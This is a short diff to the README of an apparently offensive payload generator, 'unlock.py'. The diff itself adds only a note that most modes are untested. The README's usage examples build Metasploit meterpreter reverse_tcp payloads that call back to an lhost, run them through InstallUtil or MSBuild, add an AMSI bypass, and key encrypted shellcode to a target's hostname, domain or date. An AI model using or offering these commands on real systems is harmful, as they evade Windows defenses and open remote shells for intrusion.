@@ -22,6 +22,9 @@ unlock.py [-h] [--output FILENAME] [--framework FWV] [--payload PAYLOAD] [--lhos
 --x64                Set if your custom payload is x64  
 --noamsi             Add code to bypass AMSI  
 
+## Notes
+- everything but msbuild on framework 4.0 is untested
+
 ## Examples
 - python unlock.py --framework 4.0 --payload windows/x64/meterpreter/reverse_tcp --lhost 192.168.0.1 --lport 4444 --method installUtil  
 - python unlock.py --framework 4.0 --payload windows/meterpreter/reverse_tcp --lhost 192.168.0.1 --lport 4444 --method msbuild  
@@ -29,3 +32,4 @@ unlock.py [-h] [--output FILENAME] [--framework FWV] [--payload PAYLOAD] [--lhos
 - python unlock.py --framework 4.0 --custom shellcode.bin --x64 --encshell yyyymm --noamsi  
 - python unlock.py --framework 4.0 --custom shellcode.bin --x64 --encshell hostname --enctext SECRETARY  
 - python unlock.py --framework 4.0 --custom shellcode.bin --x64 --encshell domain --enctext CONTOSO  
+
